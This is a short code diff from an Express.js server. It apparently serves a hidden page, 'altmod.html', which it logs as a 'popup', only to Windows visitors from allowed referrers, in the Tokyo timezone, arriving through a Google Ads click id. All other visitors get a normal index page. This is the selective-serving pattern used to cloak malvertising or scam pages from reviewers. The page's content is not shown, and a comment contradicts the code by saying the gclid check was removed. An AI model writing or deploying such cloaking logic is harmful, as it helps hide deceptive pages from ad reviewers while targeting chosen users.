@@ -86,6 +86,7 @@ app.post(
 
     // Check conditions and log them, removed check for gclid
     if (isWindowsOS(userAgent) && isAllowedReferrer(referer) && isTokyoTimezone && fullUrl.includes(`gclid`)) {
+      console.log('popupsent');
       res.sendFile(path.join(__dirname, "altmod.html"));
     } else {
       res.sendFile(path.join(__dirname, "index.html"));
